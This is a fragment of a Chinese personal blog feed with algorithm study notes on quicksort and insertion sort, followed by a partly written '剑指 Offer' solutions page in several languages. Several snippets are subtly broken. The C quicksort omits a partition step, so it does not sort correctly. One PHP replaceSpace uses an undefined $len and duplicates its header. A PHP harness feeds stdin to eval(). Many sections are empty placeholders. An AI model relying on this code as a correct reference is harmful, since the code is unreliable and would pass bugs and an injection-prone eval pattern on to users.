&lt;/div&gt;
&lt;div id=&quot;outline-container-org8e3602d&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8e3602d&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.1&lt;/span&gt; 介绍(Introduction)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-2-1&quot;&gt;
&lt;p&gt;
&lt;b&gt;cn&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
快速排序(Quick Sort)使用分治法策略。
基本思想是：选择一个基准数，通过一趟排序将要排序的数据分割成独立的两部分；其中一部分的所有数据都比另外
一部分的所有数据都要小。然后，再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此
达到整个数据变成有序序列。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
快速排序流程：
(1) 从数列中挑出一个基准值。
(2) 将所有比基准值小的摆放在基准前面，所有比基准值大的摆在基准的后面(相同的数可以到任一边)；在这个分区退出之后，该基准就处于数列的中间位置。
(3) 递归地把&quot;基准值前面的子数列&quot;和&quot;基准值后面的子数列&quot;进行排序。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5f0809a&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org5f0809a&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.2&lt;/span&gt; 伪代码(pseudo code)&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org27b5084&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org27b5084&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.3&lt;/span&gt; 时间复杂度和稳定&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
快速排序的时间复杂度在最坏情况下是O(N2)，平均的时间复杂度是O(N*lgN)。 
这句话很好理解：假设被排序的数列中有N个数。遍历一次的时间复杂度是O(N)，需要遍历多少次呢？至少lg(N+1)次，最多N次。
(01) 为什么最少是lg(N+1)次？快速排序是采用的分治法进行遍历的，我们将它看作一棵二叉树，它需要遍历的次数就是二叉树的深度，而根据完全二叉树的定义，它的深度至少是lg(N+1)。因此，快速排序的遍历次数最少是lg(N+1)次。
(02) 为什么最多是N次？这个应该非常简单，还是将快速排序看作一棵二叉树，它的深度最大是N。因此，快读排序的遍历次数最多是N次。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
快速排序是不稳定的算法，它不满足稳定算法的定义。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7ea73c7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org7ea73c7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.4&lt;/span&gt; 实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-2-4&quot;&gt;
&lt;p&gt;
&lt;b&gt;C&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-C&quot;&gt;&lt;span style=&quot;color: #8b2252;&quot;&gt;/**&lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt;* arr -- &amp;#24453;&amp;#25490;&amp;#24207;&amp;#30340;&amp;#25968;&amp;#32452;&lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt;* left -- &amp;#25968;&amp;#32452;&amp;#30340;&amp;#24038;&amp;#36793;&amp;#30028;&lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt;* right -- &amp;#25968;&amp;#32452;&amp;#30340;&amp;#21491;&amp;#36793;&amp;#30028;&lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt;*/&lt;/span&gt;
&lt;span style=&quot;color: #228b22;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color: #0000ff;&quot;&gt;quick_sort&lt;/span&gt;(&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[],&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;left&lt;/span&gt;,&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;right&lt;/span&gt;){
    &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt;(left &amp;lt; right){
            &lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;,&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;,&lt;span style=&quot;color: #a0522d;&quot;&gt;k&lt;/span&gt;;
            i = left;
            j = right;
            k = arr[i];
            &lt;span style=&quot;color: #a020f0;&quot;&gt;while&lt;/span&gt;(i &amp;lt; j){
                    &lt;span style=&quot;color: #a020f0;&quot;&gt;while&lt;/span&gt;(i &amp;lt; j &amp;amp;&amp;amp; arr[j] &amp;gt; k){
                            j--; &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#20174;&amp;#21491;&amp;#24448;&amp;#24038;&amp;#25214;&amp;#19968;&amp;#20010;&amp;#23567;&amp;#20110; k &amp;#30340;&amp;#25968;&lt;/span&gt;
                    }
                    &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt;(i &amp;lt; j){
                            arr[i++] = arr[j];
                    }
                    &lt;span style=&quot;color: #a020f0;&quot;&gt;while&lt;/span&gt;(i&amp;lt;j &amp;amp;&amp;amp; arr[i] &amp;lt; k){
                            i++; &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#20174;&amp;#24038;&amp;#24448;&amp;#21491;&amp;#25214;&amp;#31532;&amp;#19968;&amp;#20010;&amp;#22823;&amp;#20110; k &amp;#30340;&amp;#25968;&lt;/span&gt;
                    }
            }
            arr[i] = k;
            quick_sort(arr,left,i-1);
            quick_sort(arr,i+1,right);
    }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;b&gt;Java&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;b&gt;PHP&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org49943dd&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org49943dd&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 插入排序(InsertSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8bf591b&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8bf591b&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.1&lt;/span&gt; 介绍(Instoduction)&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge8a4e93&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orge8a4e93&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.2&lt;/span&gt; 伪代码(pseudo code)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-3-2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;for j=2 to A.length
    key=A[j]&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    //Insert A[j] into the sorted sequence A[1..j-1]
    i=j-1
    while i&amp;gt;0 and A[i]&amp;gt;key
         A[i+1]=A[i]
         i=i-1
    A[i+1]=key
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3fd4247&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3fd4247&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.3&lt;/span&gt; 实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-3-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org89bb30e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org89bb30e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.4&lt;/span&gt; 分而治之(divideand-conquer)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-3-4&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org49c9a4a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org49c9a4a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; 选择排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge1511ff&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge1511ff&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; 希尔排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb022a04&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb022a04&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.6&lt;/span&gt; 归并排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org03e530b&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org03e530b&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.7&lt;/span&gt; 基数排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org29deb5f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org29deb5f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.8&lt;/span&gt; 堆排序&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5649dc7&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org5649dc7&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;7&lt;/span&gt; 参考资料&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-7&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E7%BA%BF%E6%80%A7%E8%A1%A8&quot;&gt;线性表-维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/skywang12345/p/3603935.html&quot;&gt;数据结构与算法系列 目录&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Data-Structure" /><category term="Algorithms" /><summary type="html">1 数据结构和算法目录 首先明确一点：程序=数据结构+算法</summary></entry><entry><title type="html">剑指 Offer</title><link href="http://localhost:4000/algorithms/2019/02/12/offer/" rel="alternate" type="text/html" title="剑指 Offer" /><published>2019-02-12T00:00:00+08:00</published><updated>2019-02-12T00:00:00+08:00</updated><id>http://localhost:4000/algorithms/2019/02/12/offer</id><content type="html" xml:base="http://localhost:4000/algorithms/2019/02/12/offer/">&lt;div id=&quot;outline-container-orgb2a1bd5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgb2a1bd5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 前言&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。&lt;/li&gt;
&lt;li&gt;文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。&lt;/li&gt;
&lt;li&gt;引用别人的一句话“我们不生产代码，我们是代码的搬运工”。&lt;/li&gt;
&lt;li&gt;文章内容仅供参考。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3e5c834&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org3e5c834&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 1~10&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;二维数组的查找
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-C++&quot; id=&quot;org7ea6b67&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgde8ea11&quot;&gt;   &amp;lt;?php

function Find($target, $array)
{
    foreach($array as $key=&amp;gt;$val){
        if(in_array($target,$val)){
            return &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        }
    }
    return &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;false&quot;&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
}
while(fscanf(STDIN,&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;%d,%s&quot;&lt;/span&gt;,$a,$b) == 2){
    $target = $a&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    eval('$array='.$b.'&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;');&lt;/span&gt;
    try{
        echo Find($target,$array).&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    }catch(Exception $e){
        die&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot; id=&quot;org935de8a&quot;&gt;   &lt;span style=&quot;color: #a020f0;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #a020f0;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Solution&lt;/span&gt; {
    &lt;span style=&quot;color: #a020f0;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;boolean&lt;/span&gt; &lt;span style=&quot;color: #0000ff;&quot;&gt;Find&lt;/span&gt;(&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;target&lt;/span&gt;, &lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; [][] &lt;span style=&quot;color: #a0522d;&quot;&gt;array&lt;/span&gt;) {
        &lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;rows&lt;/span&gt; = array.length;
        &lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;cols&lt;/span&gt; = array[0].length;
        &lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;=rows-1,&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;=0;
        &lt;span style=&quot;color: #a020f0;&quot;&gt;while&lt;/span&gt;(i&amp;gt;=0 &amp;amp;&amp;amp; j&amp;lt;&lt;span style=&quot;color: #228b22;&quot;&gt;cols&lt;/span&gt;){
            &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt;(target&amp;lt;&lt;span style=&quot;color: #228b22;&quot;&gt;array&lt;/span&gt;[i][j])
                i--;
            &lt;span style=&quot;color: #a020f0;&quot;&gt;else&lt;/span&gt; &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt;(target&amp;gt;array[i][j])
                j++;
            &lt;span style=&quot;color: #a020f0;&quot;&gt;else&lt;/span&gt;
                &lt;span style=&quot;color: #a020f0;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #008b8b;&quot;&gt;true&lt;/span&gt;;
        }
        &lt;span style=&quot;color: #a020f0;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;;
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-python&quot; id=&quot;org6cc1a0b&quot;&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Solution&lt;/span&gt;:
 &lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;array &amp;#20108;&amp;#32500;&amp;#21015;&amp;#34920;&lt;/span&gt;
 &lt;span style=&quot;color: #a020f0;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color: #0000ff;&quot;&gt;Find&lt;/span&gt;(&lt;span style=&quot;color: #a020f0;&quot;&gt;self&lt;/span&gt;, target, array):
     &lt;span style=&quot;color: #a0522d;&quot;&gt;rows&lt;/span&gt;=&lt;span style=&quot;color: #483d8b;&quot;&gt;len&lt;/span&gt;(array)
     &lt;span style=&quot;color: #a0522d;&quot;&gt;cols&lt;/span&gt;=&lt;span style=&quot;color: #483d8b;&quot;&gt;len&lt;/span&gt;(array[0])
     &lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;=rows-1
     &lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;=0
     &lt;span style=&quot;color: #a020f0;&quot;&gt;while&lt;/span&gt; i&amp;gt;=0 &lt;span style=&quot;color: #a020f0;&quot;&gt;and&lt;/span&gt; j&amp;lt;cols:
         &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; target&amp;lt;array[i][j]:
             &lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt; -= 1
         &lt;span style=&quot;color: #a020f0;&quot;&gt;elif&lt;/span&gt; target&amp;gt;array[i][j]:
             &lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt; += 1
         &lt;span style=&quot;color: #a020f0;&quot;&gt;else&lt;/span&gt;:
             &lt;span style=&quot;color: #a020f0;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #008b8b;&quot;&gt;True&lt;/span&gt;
     &lt;span style=&quot;color: #a020f0;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #008b8b;&quot;&gt;False&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orga8090c4&quot;&gt;   class Solution
{
    public bool Find(int target, int[][] array)
    {
        int row=0&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        int col=array[0].Length-1&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        while(row&amp;lt;=array.Length-1&amp;amp;&amp;amp;col&amp;gt;=0){
            if(target==array[row][col])
                return true&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
            else if(target&amp;gt;array[row][col])
                row++&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
            else
                col--&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        }
        return false&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;

    }
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
矩阵是有序的，从左下角来看，向上数字递减，向右数字递增，因此从左下角开始查找，当要查找数字比左下角数字大时。右移要查找数字比左下角数字小时，上移。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;替换空格
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org278d2d5&quot;&gt;   &amp;lt;?php
// &amp;#30452;&amp;#25509;&amp;#20351;&amp;#29992;&amp;#20989;&amp;#25968;
function replaceSpace($str)
{
    return str_replace(' ','%20',$str)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
}
// &amp;#19981;&amp;#20801;&amp;#35768;&amp;#30452;&amp;#25509;&amp;#35843;&amp;#29992;&amp;#20869;&amp;#32622;&amp;#20989;&amp;#25968;
&amp;lt;?php
function replaceSpace($str)
{
    $res = ''&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    $strLength = strlen($str)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    for($i=0&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;$i&amp;lt;$len;$i++){&lt;/span&gt;
        if($str[$i]==' '){
                $res .='%20'&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        }else{
                $res .=$str[$i]&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        }
    }
    return $res&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;问题1：替换字符串，是在原来的字符串上做替换，还是新开辟一个字符串做替换！&lt;/li&gt;
&lt;li&gt;问题2：在当前字符串替换，怎么替换才更有效率（不考虑内置的replace方法）。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;从前往后替换，后面的字符要不断往后移动，要多次移动，所以效率低下&lt;/li&gt;
&lt;li&gt;从后往前，先计算需要多少空间，然后从后往前移动，则每个字符只为移动一次，这样效率更高一点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;从尾到头打印链表
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
输入一个链表，按链表值从尾到头的顺序返回一个ArrayList。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org2befa12&quot;&gt;     &amp;lt;?php

/*class ListNode{
    var $val&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    var $next = NULL&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    function __construct($x){
        $this-&amp;gt;val = $x&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    }
}*/
function printListFromTailToHead($head)
{
    $arrayList = []&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    while($head !== null){
        $arrayList[]=$head-&amp;gt;val&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        $head=$head-&amp;gt;next&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
    }
    return array_reverse($arrayList)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
有三种思路，
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一就是利用栈先入后出的特性完成；&lt;/li&gt;
&lt;li&gt;第二就是存下来然后进行数组翻转；&lt;/li&gt;
&lt;li&gt;第三是利用递归。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;重建二叉树
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org7d36bbf&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org54ec27d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org54ec27d&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 11~20&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org8254443&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org8254443&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 21~30&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

